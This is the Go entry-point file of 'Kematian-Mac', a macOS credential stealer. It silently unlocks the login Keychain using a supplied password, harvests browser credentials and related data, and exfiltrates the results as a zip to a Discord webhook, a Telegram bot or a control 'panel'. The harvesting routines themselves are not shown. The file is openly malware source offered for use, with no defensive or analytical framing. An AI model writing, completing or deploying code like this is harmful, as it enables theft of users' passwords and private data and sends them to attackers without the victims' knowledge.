// Kematian-Mac: standalone macOS harvest binary (from Kematian-main recovery engine).
// Collects browser credentials and related data, then uploads a zip to a Discord webhook.
package main

import (
	"flag"
	"log"
	"os"
	"runtime"
	"strings"

	"recovery/recovery/crypto"
)

// Set at build time: -ldflags "-X main.defaultWebhook=https://discord.com/api/webhooks/..."
var defaultWebhook string

func main() {
	webhookFlag := flag.String("webhook", "", "Discord webhook URL (or DISCORD_WEBHOOK_URL / KEMATIAN_WEBHOOK_URL)")
	telegramTokenFlag := flag.String("telegram-token", "", "Telegram bot token (or TELEGRAM_BOT_TOKEN)")
	telegramChatFlag := flag.String("telegram-chat", "", "Telegram chat/channel ID (or TELEGRAM_CHAT_ID)")
	panelURLFlag := flag.String("panel-url", "", "Kematian panel base URL (or PANEL_URL / KEMATIAN_PANEL_URL)")
	panelKeyFlag := flag.String("panel-key", "", "Panel API key (or PANEL_API_KEY / KEMATIAN_PANEL_API_KEY)")
	macPasswordFlag := flag.String("mac-password", "", "macOS login password — unlocks Keychain silently (or KEMATIAN_MAC_PASSWORD)")
	quiet := flag.Bool("quiet", false, "minimal console output")
	flag.Parse()

	uploadCfg := resolveUploadConfig(*webhookFlag, *telegramTokenFlag, *telegramChatFlag, *panelURLFlag, *panelKeyFlag)

	macPassword := strings.TrimSpace(*macPasswordFlag)
	if macPassword == "" {
		macPassword = strings.TrimSpace(os.Getenv("KEMATIAN_MAC_PASSWORD"))
	}
	if macPassword != "" {
		crypto.SetMacLoginPassword(macPassword)
		if err := crypto.EnsureLoginKeychainUnlocked(); err != nil {
			log.Printf("[kematian] keychain unlock failed: %v", err)
		} else if !*quiet {
			log.Printf("[kematian] login keychain unlocked (no password modal)")
		}
	}

	if runtime.GOOS != "darwin" {
		log.Fatalf("kematian is built for macOS only (GOOS=%s)", runtime.GOOS)
	}

	if !uploadCfg.valid() {
		log.Fatal("upload destination required: configure panel URL, Discord webhook, and/or Telegram bot token + chat id at build time or via flags/env")
	}

	hostname, _ := os.Hostname()
	if hostname == "" {
		hostname = "mac"
	}
	uploadCfg.Hostname = hostname
	uploadCfg.OS = runtime.GOOS
	uploadCfg.Arch = runtime.GOARCH

	if !*quiet {
		log.Printf("[kematian] starting harvest on %s (%s/%s) — upload via %s", hostname, runtime.GOOS, runtime.GOARCH, uploadDestLabel(uploadCfg))
	}

	payload, err := runHarvest(hostname)
	if err != nil {
		log.Fatalf("[kematian] harvest failed: %v", err)
	}

	if err := uploadAllHarvest(uploadCfg, hostname, payload, *quiet); err != nil {
		log.Fatalf("[kematian] upload failed: %v", err)
	}

	if !*quiet {
		log.Printf("[kematian] upload complete, exiting")
	}
	os.Exit(0)
}

func sanitizeFilename(s string) string {
	var b strings.Builder
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9', r == '-', r == '_':
			b.WriteRune(r)
		default:
			b.WriteRune('_')
		}
	}
	out := b.String()
	if out == "" {
		return "mac"
	}
	return out
}